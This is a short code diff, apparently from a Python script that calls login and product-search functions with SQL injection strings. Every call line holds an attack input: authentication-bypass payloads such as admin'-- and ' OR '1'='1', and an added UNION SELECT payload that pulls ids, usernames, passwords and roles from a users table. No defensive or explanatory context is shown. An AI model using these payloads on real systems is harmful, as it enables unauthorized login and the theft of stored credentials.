@@ -19,4 +19,4 @@ def login(username, password):
 search_product("' OR 1=1--")  
 login("admin'--", "anything")  
 login("' OR '1'='1", "' OR '1'='1")   
-       
+search_product("' UNION SELECT id, username, password, role FROM users--")       
